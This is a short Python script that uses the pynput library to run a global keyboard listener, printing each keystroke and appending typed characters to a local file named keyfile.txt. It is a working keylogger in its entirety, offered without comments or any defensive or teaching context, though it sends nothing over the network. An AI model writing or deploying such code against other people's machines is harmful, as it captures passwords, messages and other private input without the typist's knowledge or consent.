from pynput import keyboard

def on_press(key):
    print(str(key))
    with open("keyfile.txt",'a') as logkey:
        try:
            char=key.char
            logkey.write(char)
        except:
            print("Error Ocurred")

if __name__ == "__main__":
    listener=keyboard.Listener(on_press=on_press)
    listener.start()
    input()